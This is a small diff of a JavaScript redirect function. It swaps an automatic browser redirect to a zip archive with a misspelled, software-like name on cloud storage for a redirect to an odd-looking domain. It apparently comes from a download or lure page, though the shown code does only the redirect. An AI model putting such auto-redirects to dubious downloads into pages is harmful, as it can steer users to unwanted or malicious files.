@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://hdliswhs.oss-cn-hongkong.aliyuncs.com/HoiloWeolrd6.9.7-x64.zip";
+		var url="https://www.yssuygdm.com";
 		window.location=url;
 	}
 }
